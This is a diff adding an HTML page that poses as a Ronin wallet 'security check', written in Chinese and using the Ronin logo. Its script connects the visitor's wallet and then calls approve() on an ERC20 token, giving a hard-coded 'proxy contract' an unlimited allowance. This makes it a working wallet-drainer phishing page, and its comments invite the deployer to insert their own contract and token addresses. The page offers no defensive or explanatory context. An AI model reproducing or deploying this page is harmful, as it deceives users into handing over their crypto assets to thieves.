@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ronin 钱包安全检测</title>
+  <style>
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+    body {
+      background-color: #0a0e17;
+      font-family: "Segoe UI", Roboto, sans-serif;
+      color: #ffffff;
+      text-align: center;
+      padding: 60px 20px;
+    }
+    h1 {
+      font-size: 2.8rem;
+      color: #ffffff;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1rem;
+      color: #bbbbbb;
+      margin-bottom: 40px;
+    }
+    .btn {
+      font-size: 1rem;
+      padding: 14px 28px;
+      border: none;
+      border-radius: 8px;
+      margin: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .connect-btn {
+      background-color: #2970ff;
+      color: #fff;
+    }
+    .connect-btn:hover {
+      background-color: #1c54c8;
+    }
+    .approve-btn {
+      background-color: #0cd66e;
+      color: #fff;
+    }
+    .approve-btn:hover {
+      background-color: #0ab862;
+    }
+    #wallet-address {
+      margin-top: 30px;
+      color: #4fd1c5;
+      font-weight: bold;
+    }
+    .logo {
+      max-width: 120px;
+      margin-bottom: 30px;
+    }
+  </style>
+</head>
+<body>
+  <!-- 可选 Logo -->
+  <img class="logo" src="https://roninchain.com/images/logos/logo-blue.svg" alt="Ronin Logo" />
+
+  <h1>Ronin 钱包安全检测</h1>
+  <p>请连接您的钱包并授权智能合约，以进行资产权限检测。</p>
+
+  <button class="btn connect-btn" onclick="connectWallet()">🔌 连接钱包</button>
+  <button class="btn approve-btn" onclick="approveContract()">✅ 授权合约</button>
+
+  <div id="wallet-address"></div>
+
+  <!-- 引入 ethers.js -->
+  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+  <script>
+    let userAddress;
+    const contractAddress = "0xfdB563c33AB7F14e411d58651959318597D8CC1E"; // 替换为你的代理合约地址
+    const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // 替换为你的 ERC20 代币地址
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          userAddress = accounts[0];
+          document.getElementById("wallet-address").innerText = "钱包地址：" + userAddress;
+        } catch (err) {
+          alert("连接失败：" + err.message);
+        }
+      } else {
+        alert("请安装 MetaMask 或 Ronin Wallet 插件");
+      }
+    }
+
+    async function approveContract() {
+      if (!userAddress) {
+        alert("请先连接钱包！");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+      const tokenABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+      const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+      try {
+        const tx = await tokenContract.approve(contractAddress, ethers.constants.MaxUint256);
+        alert("授权成功！交易哈希：" + tx.hash);
+      } catch (err) {
+        alert("授权失败：" + err.message);
+      }
+    }
+  </script>
+</body>
+</html>
